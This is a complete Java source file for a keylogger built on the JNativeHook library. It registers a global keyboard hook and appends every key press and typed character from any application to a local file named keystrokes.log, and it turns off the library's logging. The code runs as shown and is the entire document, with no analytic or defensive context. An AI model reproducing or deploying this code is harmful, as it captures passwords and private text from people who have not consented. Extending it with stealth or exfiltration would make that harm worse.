import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

public class KeyLogger implements NativeKeyListener {
    private static final String LOG_FILE = "keystrokes.log";
    private BufferedWriter writer;

    public KeyLogger() {
        try {
            writer = new BufferedWriter(new FileWriter(LOG_FILE, true));
        } catch (IOException e) {
            System.err.println("Failed to open log file: " + e.getMessage());
        }
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String key = NativeKeyEvent.getKeyText(e.getKeyCode());
        logKey("[PRESS:" + key + "]");
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        // Optional: track releases if needed
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        char c = e.getKeyChar();
        if (c != NativeKeyEvent.CHAR_UNDEFINED) {
            logKey(String.valueOf(c));
        }
    }

    private void logKey(String data) {
        if (writer != null) {
            try {
                writer.write(data);
                writer.flush();
            } catch (IOException e) {
                System.err.println("Write failed: " + e.getMessage());
            }
        }
    }

    public void shutdown() {
        if (writer != null) {
            try {
                writer.close();
            } catch (IOException ignored) {}
        }
    }

    public static void main(String[] args) {
        // Disable JNativeHook verbose logging
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);
        logger.setUseParentHandlers(false);

        KeyLogger kl = new KeyLogger();

        try {
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(kl);
            System.out.println("Hook registered. Logging to " + LOG_FILE);

            // Keep alive until Enter pressed in console
            System.in.read();

            GlobalScreen.removeNativeKeyListener(kl);
            GlobalScreen.unregisterNativeHook();
            kl.shutdown();
        } catch (NativeHookException | IOException e) {
            System.err.println("Fatal: " + e.getMessage());
            kl.shutdown();
        }
    }
}